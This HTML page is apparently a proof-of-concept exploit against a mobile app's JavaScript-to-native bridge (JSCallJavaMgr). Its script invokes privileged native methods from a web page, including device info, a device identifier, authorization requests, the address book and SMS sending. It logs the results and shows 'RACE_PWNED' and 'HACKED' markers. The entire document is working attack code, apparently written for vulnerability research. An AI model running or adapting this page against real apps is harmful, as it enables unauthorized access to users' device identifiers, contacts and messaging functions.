<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Race PoC - DevicePlugin</title></head>
<body>
<h2>Race PoC - DevicePlugin</h2>
<pre id="log" style="font-size:11px;max-height:90vh;overflow:auto;"></pre>
<script>
var log = document.getElementById('log');
function addLog(s) { log.textContent += '[' + Date.now() + '] ' + s + '\n'; }

var callCount = 0;
function callJSBridge(module, method, param) {
    callCount++;
    var callId = module + '_' + method + '_' + callCount + '_' + Date.now();
    var cbName = 'cb_' + callId.replace(/[^a-zA-Z0-9_]/g, '_');

    window[cbName] = function(jsonStr) {
        addLog('<<< ' + method + ': ' + (typeof jsonStr === 'string' ? jsonStr.substring(0, 200) : JSON.stringify(jsonStr).substring(0, 200)));
    };

    var req = {
        callback: cbName,
        module: module,
        method: method,
        param: param || {},
        callId: callId
    };

    try {
        window.JSCallJavaMgr.JSCallNative(JSON.stringify(req));
        addLog('>>> ' + module + '.' + method + ' sent');
        return true;
    } catch(e) {
        addLog('>>> ' + module + '.' + method + ' ERR: ' + e.message);
        return false;
    }
}

function startTest() {
    addLog('=== DevicePlugin Test ===');
    addLog('URL: ' + location.href);

    if (!window.JSCallJavaMgr) {
        addLog('ERROR: JSCallJavaMgr not found!');
        return;
    }
    addLog('JSCallJavaMgr OK');
    addLog('');

    callJSBridge('DevicePlugin', 'GetClientInfo', {});
    callJSBridge('DevicePlugin', 'GetDeviceInfo', {});
    callJSBridge('DevicePlugin', 'GetQimei36', {});
    callJSBridge('DevicePlugin', 'CheckUpgrade', {});
    callJSBridge('DevicePlugin', 'GetAuthorizationInfo', {});
    callJSBridge('DevicePlugin', 'RequestAuthorization', {scope: 'scope.userInfo'});
    callJSBridge('DevicePlugin', 'IsSupportPendant', {});
    callJSBridge('DevicePlugin', 'ToggleRingingAudio', {});
    callJSBridge('DevicePlugin', 'OpenAddressBook', {});
    callJSBridge('DevicePlugin', 'RotateScreen', {orientation: 1});
    callJSBridge('DevicePlugin', 'SetScreenRotateEnable', {enable: true});
    callJSBridge('DevicePlugin', 'GetScreenOrientation', {});
    callJSBridge('DevicePlugin', 'Vibrate', {});
    callJSBridge('DevicePlugin', 'ScanQrcode', {});
    callJSBridge('DevicePlugin', 'LaunchSendSMS', {});
    callJSBridge('UIPlugin', 'ShowToast', {content: 'RACE_PWNED', duration: 5000, type: 0});
    callJSBridge('CommonPlugin', 'SetTitle', {title: 'HACKED'});

    addLog('');
    addLog('Total: ' + callCount + ' calls sent. Waiting callbacks...');
}

setTimeout(function() {
    addLog('Starting in 2s...');
    setTimeout(startTest, 2000);
}, 500);
</script>
</body>
</html>
